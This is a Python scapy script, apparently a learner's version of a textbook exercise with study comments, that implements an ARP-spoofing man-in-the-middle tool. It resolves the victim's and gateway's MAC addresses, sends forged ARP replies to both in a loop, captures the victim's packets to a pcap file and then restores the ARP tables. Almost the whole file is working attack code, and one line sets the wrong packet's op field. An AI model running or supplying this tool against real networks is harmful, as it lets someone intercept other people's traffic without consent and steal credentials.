from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

#* scapy Ether - https://cyruslab.net/2019/11/19/pythonunderstanding-the-fields-of-ether-and-arp-in-scapy/

import os
import sys
import time

def get_mac(targetip) -> str:
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp = ARP(op='who-has', pdst=targetip) 
    #? packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip) 
    #? The ARP section needs to be on the same line as the Ether section
    #? or you need to assign them to 2 different variables and use the syntax below ether/arp
    #* ARP message overview - http://www.tcpipguide.com/free/t_ARPMessageFormat.htm
    #* https://cyruslab.net/2019/11/19/pythonunderstanding-the-fields-of-ether-and-arp-in-scapy/
    #* https://www.programcreek.com/python/example/86563/scapy.all.Ether
    #* scapy.layers.l2
    #* Ether - https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html
    #* pdst - packet destination
    #* resp, _ = srp(Ether, timeout=2, retry=10, verbose=False)
    resp, _ = srp(ether/arp, timeout=2, retry=10, verbose=False)
    #? srp = Scapy send and recieve packet 

    for _, r in resp:
        # print(type(r[Ether].src))
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='wlp2s0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface

        conf.iface = interface
        conf.verb = 0
        #* conf is an import from scapy which sets configuration items
        #* https://scapy.readthedocs.io/en/latest/api/scapy.config.html

        print(f'Initialized {interface}')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}')
        print(f'Victim ({victim}) is at {self.victimmac}')
        print('-'*30)


    def run(self):
        #* https://docs.python.org/3/library/multiprocessing.html?highlight=multiprocessing#multiprocessing.Process
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()


    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2 #? Option 2 is an ARP reply
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}') #? I'm not sure where hwsrc is coming from
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP()
        poison_victim.op = 2 #? Option 2 is an ARP reply
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}') #? I'm not sure where hwsrc is coming from
        print(poison_gateway.summary())
        print('-'*30)    

        print(f'Starting the ARP poisoning process. [CTRL+C to stop]')    

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()

            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)


    def sniff(self, count=200):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f'ip host {self.victim}'
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        #? iface - https://scapy.readthedocs.io/en/latest/api/scapy.config.html#scapy.config.Conf.ifaces
        wrpcap('arper.pcap', packets)
        print('Writing packets')
        self.restore()
        self.poison_thread.terminate()
        print('Complete')


    def restore(self):
        print('Resetting ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()